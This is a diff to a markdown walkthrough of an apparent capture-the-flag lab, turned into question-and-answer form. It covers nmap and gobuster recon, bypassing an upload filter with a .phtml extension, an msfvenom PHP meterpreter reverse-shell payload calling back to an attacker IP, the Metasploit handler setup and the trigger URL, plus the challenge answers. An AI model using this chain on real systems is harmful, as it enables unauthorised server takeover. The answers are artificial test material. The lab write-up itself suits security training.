@@ -42,43 +42,57 @@ ping 10.48.145.37
 ```
 ✔ Target machine successfully responded
 ✔ Network connectivity established
+![ping_check](screenshots/ping_check.png)
 
 🔍 Task 2: Reconnaissance
 Nmap Scan
 ```bash
 nmap -sT -T5 -sV 10.48.145.37
 ```
-🔎 Findings:
+Scan the box; how many ports are open?
 Open Ports: 6
+![nmap_command](screenshots/nmap_command.png)
+
+What version of the squid proxy is running on the machine?
 Squid Proxy Version: 4.10
+![version](screenshots/version.png)
+
+What is the most likely operating system this machine is running?
 Web Server: Apache httpd 2.4.41 (Ubuntu)
+![os](screenshots/os.png)
+
+What port is the web server running on?
 Web Port: 3333
+
 🌐 Web Access
 http://10.48.145.37:3333/
-
 ✔ Confirmed active web application
+![url](screenshots/url.png)
 
 🗂️ Task 3: Directory Enumeration
 ```bash
 gobuster dir -u http://10.48.183.155:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
-📌 Result:
-Discovered hidden upload directory
-Found web-based file upload functionality
+What is the directory that has an upload form page?
+answer is: internal/
+![directory](screenshots/directory.png)
 
 💥 Task 4: File Upload Exploitation
 🔍 Burp Suite Testing
 Tested multiple file extensions
-Identified upload restrictions
-🚫 Blocked:
-.php
-✅ Allowed:
+What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
+answer is: .php
+
+What extension is allowed after running the above exercise?
 .phtml
+![brupsuite](screenshots/brupsuite.png)
+
 🧨 Task 5: Reverse Shell Attack
 Payload Generation
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.205.229 LPORT=4444 -f raw -o shell.phtml
 ```
+![msfvenom](screenshots/msfvenom.png)
 ⚙️ Metasploit Handler
 msfconsole
 use exploit/multi/handler
@@ -86,14 +100,15 @@ set payload php/meterpreter/reverse_tcp
 set LHOST 192.168.205.229
 set LPORT 4444
 run
+
+upload the payload 
+![website](screenshots/website.png)
+
 🚀 Trigger Payload
 http://10.49.144.114:3333/internal/uploads/shell.phtml
 
 ✔ Reverse shell successfully executed
 
-
-👤 Final Result
-Field	Value
-Web Server User	bill
-Access Type	Meterpreter Session
-Exploit Type	File Upload + Reverse Shell
+What is the name of the user who manages the webserver?
+answer is: bill
+![username](screenshots/username.png)
